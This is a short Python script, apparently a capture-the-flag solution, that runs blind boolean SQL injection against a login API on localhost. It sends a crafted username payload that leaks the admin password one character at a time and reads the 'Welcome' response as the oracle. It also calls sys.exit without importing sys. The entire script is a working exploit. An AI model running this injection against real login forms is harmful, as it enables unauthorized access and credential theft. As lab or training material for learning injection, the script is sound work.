import requests
import string

url = 'http://localhost:3000/api/login'

s = requests.Session()

flag = ""
i = 1

while True: 
	for char in string.printable:
		r = s.post(url, { 
		'username': r'admin" AND (SELECT BINARY SUBSTR(password,' + str(i) + r',1) LIMIT 1)="' + char + r'" --' + (7 - len(str(i))) * ' ' + r'%02',
		'password': 'A' 
		})
		if "Welcome" in r.text:
			flag += char
			print(flag)
			i += 1 
			
			if char == '}': 
				sys.exit(1) 
			
			break
